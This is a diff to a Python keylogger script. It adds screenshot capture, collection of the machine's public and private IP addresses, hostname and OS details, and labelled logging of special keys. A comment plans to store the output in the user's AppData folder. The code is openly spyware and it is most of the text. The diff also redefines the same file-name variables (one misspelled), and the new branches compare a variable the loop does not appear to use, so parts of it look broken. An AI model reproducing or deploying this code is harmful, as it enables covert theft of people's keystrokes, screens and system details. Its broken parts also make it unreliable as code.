@@ -31,19 +31,43 @@ from multiprocessing import Process, freeze_support
 from PIL import ImageGrab
 
 keys_information = "key_log.txt"
+system_information= "systeminfo.txt"
+screenshot_information= "screenshots.png"
 system_information = "syseminfo.txt"
 clipboard_information = "clipboard.txt"
-screenshot_information = "screenshot.png"
+
 #file_path to be changed to C:\Users\Geek\AppData\Roaming
 file_path = os.getcwd()
 extend="\\"
 
+def screenshot():
+    im = ImageGrab.grab()
+    im.save(file_path+extend+screenshot_information )
+screenshot()
+
+def computer_information():
+    with open(file_path+extend+system_information,"a") as f:
+        hostname = socket.gethostname()
+        IPaddr = socket.gethostbyname(hostname)
+        try:
+            public_ip = get("https://api.ipify.org").text
+            f.write("Public IP Address: " + public_ip + '\n')
+        except Exception:
+            f.write("Couldn't get Public IP Address (most likely max query)")
+
+        f.write("Processor: " + (platform.processor()) + '\n')
+        f.write("System: " + platform.system() + " " + platform.version() + '\n')
+        f.write("Machine: " + platform.machine() + '\n')
+        f.write("Hostname: " + hostname + "\n")
+        f.write("Private IP Address: " + IPaddr + "\n")
+computer_information()
+ 
+
 count = 0
 keys=[]
-
 def on_press(key):
     global keys,count
-    print(key)
+    print(key) #remove this
     keys.append(key)
     count += 1
 
@@ -60,6 +84,42 @@ def write_file(keys):
             if k.find("space")>0:
                 f.write('\n')
                 f.close()
+            elif key==Key.shift or key == Key.shift_l or key == Key.shift_r:
+                f.write("[shift] \n")
+            elif key == Key.ctrl_l or key == Key.ctrl_r:
+                f.write("[ctrl] \n")
+            elif key == Key.alt_l or key == Key.alt_gr:
+                f.write("[alt] \n")
+            elif key==Key.enter:
+                f.write("[enter] \n")
+            elif key == Key.backspace:
+                f.write("[backspace] \n")
+            elif key==Key.caps_lock:
+                f.write("[caps_lock] \n")
+            elif key==Key.tab:
+                f.write("[tab] \n")
+            elif key==Key.end:
+                f.write("[end] \n")
+            elif key==Key.home:
+                f.write("[home] \n")
+            elif key==Key.page_down:
+                f.write("[page_down] \n")
+            elif key==Key.page_up:
+                f.write("[page_up] \n")
+            elif key==Key.pause:
+                f.write("[pause] \n")
+            elif key==Key.insert:
+                f.write("[insert] \n")
+            elif key==Key.up:
+                f.write("[up] \n")
+            elif key==Key.down:
+                f.write("[down] \n")
+            elif key==Key.right:
+                f.write("[right] \n")
+            elif key==Key.left:
+                f.write("[left] \n")
+            elif key==Key.delete:
+                f.write("[delete] \n")
             elif k.find("Key") == -1:
                 f.write(k)
                 f.close()
